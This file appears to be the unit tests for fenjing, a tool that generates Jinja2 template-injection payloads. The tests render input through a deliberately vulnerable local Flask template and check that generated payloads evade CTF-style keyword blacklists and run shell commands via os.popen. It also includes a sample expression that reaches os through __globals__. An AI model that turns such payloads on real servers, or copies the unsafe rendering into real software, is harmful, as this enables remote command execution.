import sys
import unittest

from flask import Flask, render_template_string

from fenjing import const
from fenjing.cracker import Cracker, normalize_expr_by_context
from fenjing.options import Options
from fenjing.submitter import HTTPResponse, Submitter
from fenjing.const import BRAINROT_VARNAMES


ISSUE55_BLACKLIST = [
    "#",
    "%",
    "!",
    "=",
    "+",
    "-",
    "/",
    "&",
    "^",
    "<",
    ">",
    "and",
    "or",
    "not",
    "\\",
    "[",
    "]",
    ".",
    "_",
    ",",
    "0",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    '"',
    "'",
    "`",
    "?",
    "attr",
    "request",
    "args",
    "cookies",
    "headers",
    "files",
    "form",
    "json",
    "flag",
    "lipsum",
    "cycler",
    "joiner",
    "namespace",
    "url_for",
    "flash",
    "config",
    "session",
    "dict",
    "range",
    "lower",
    "upper",
    "format",
    "get",
    "item",
    "key",
    "pop",
    "globals",
    "class",
    "builtins",
    "mro",
    "True",
    "False",
]

WEB370_BLACKLIST = [
    "'",
    '"',
    "args",
    "[",
    "]",
    "_",
    "os",
    "{{",
    "request",
    "0",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
]

UNSTABLE_BRAINROT_NAMES = [name for name in BRAINROT_VARNAMES if len(name) >= 3]


class LocalTemplateSubmitter(Submitter):
    def __init__(self, blacklist):
        super().__init__()
        self.blacklist = blacklist
        self.app = Flask(__name__)

    def submit_raw(self, raw_payload):
        if any(word in raw_payload for word in self.blacklist):
            return HTTPResponse(200, "NO!")
        template = f"""
Hello, {raw_payload}
"""
        with self.app.app_context():
            try:
                return HTTPResponse(200, render_template_string(template))
            except Exception as exc:
                return HTTPResponse(500, f"{type(exc).__name__}:{exc}")


class ProbeTamperedSubmitter(LocalTemplateSubmitter):
    def submit_raw(self, raw_payload):
        response = super().submit_raw(raw_payload)
        if response is None:
            return None
        if "f3n\nj1ng" in response.text:
            return HTTPResponse(response.status_code, response.text.replace("f3n\nj1ng", "NO!"))
        return response


class CrackerLocalRegressionTest(unittest.TestCase):
    def setUp(self):
        super().setUp()
        self.submitter = LocalTemplateSubmitter(ISSUE55_BLACKLIST)
        self.options = Options(
            autofix_500=const.AutoFix500Code.DISABLED,
            python_version=const.PythonVersion.PYTHON3,
            python_subversion=sys.version_info.minor,
        )

    def test_issue55_probe_is_detected_as_success(self):
        waf = lambda payload: all(word not in payload for word in ISSUE55_BLACKLIST)
        cracker = Cracker(self.submitter, options=self.options)
        result = cracker.crack_with_waf(waf)
        self.assertIsNotNone(result)
        assert result is not None
        full_payload_gen, will_print, test_result, _ = result
        self.assertTrue(will_print)
        self.assertEqual(test_result, "SUCCESS")

        payload, will_print = full_payload_gen.generate(const.OS_POPEN_READ, "echo test")
        self.assertTrue(will_print)
        self.assertIsNotNone(payload)
        assert payload is not None
        response = self.submitter.submit(payload)
        self.assertIsNotNone(response)
        assert response is not None
        self.assertIn("Hello, test", response.text)

    def test_probe_fallback_can_skip_a_bad_probe_result(self):
        submitter = ProbeTamperedSubmitter([])
        waf = lambda payload: True
        cracker = Cracker(submitter, options=self.options)
        cracker.shell_test_probes = (
            type(cracker.shell_test_probes[0])("echo f3n&&echo j1ng", "f3n\nj1ng"),
            type(cracker.shell_test_probes[0])("echo fen&&echo jing", "fen\njing"),
        )
        result = cracker.crack_with_waf(waf)
        self.assertIsNotNone(result)
        assert result is not None
        _, will_print, test_result, _ = result
        self.assertTrue(will_print)
        self.assertEqual(test_result, "SUCCESS")

    def test_web370_blacklist_is_crackable(self):
        submitter = LocalTemplateSubmitter(WEB370_BLACKLIST)
        waf = lambda payload: all(word not in payload for word in WEB370_BLACKLIST)
        cracker = Cracker(submitter, options=self.options)
        result = cracker.crack_with_waf(waf)
        self.assertIsNotNone(result)
        assert result is not None
        full_payload_gen, will_print, test_result, _ = result
        self.assertTrue(will_print)
        self.assertEqual(test_result, "SUCCESS")

        payload, will_print = full_payload_gen.generate(const.OS_POPEN_READ, "id")
        self.assertTrue(will_print)
        self.assertIsNotNone(payload)
        assert payload is not None
        self.assertEqual([word for word in WEB370_BLACKLIST if word in payload], [])
        self.assertFalse(any(word in payload for word in UNSTABLE_BRAINROT_NAMES))
        self.assertLess(len(payload), 400)

        response = submitter.submit(payload)
        self.assertIsNotNone(response)
        assert response is not None
        self.assertEqual(response.status_code, 200)
        self.assertIn("Hello,", response.text)

    def test_normalize_expr_by_context_ignores_non_string_whitespace(self):
        context = {"aa": ("__globals__", 0), "bb": ("os", 0)}
        expr1 = "{{(lipsum|attr(aa)).get(bb).read()}}"
        expr2 = "{{ ( lipsum | attr(aa) ) . get( bb ) . read( \t\n ) }}"
        self.assertEqual(
            normalize_expr_by_context(expr1, context),
            normalize_expr_by_context(expr2, context),
        )

    def test_echo_outer_pattern_can_be_upgraded_even_if_waf_probe_is_conservative(self):
        submitter = LocalTemplateSubmitter([])

        def conservative_waf(payload):
            return "{{" not in payload and "{%print" not in payload

        cracker = Cracker(submitter, options=self.options)
        result = cracker.crack_with_waf(conservative_waf)
        self.assertIsNotNone(result)
        assert result is not None
        full_payload_gen, will_print, _, _ = result
        self.assertTrue(will_print)
        self.assertTrue(full_payload_gen.will_print)

        payload, will_print = full_payload_gen.generate(const.STRING, "hello")
        self.assertTrue(will_print)
        self.assertIsNotNone(payload)


if __name__ == "__main__":
    unittest.main()
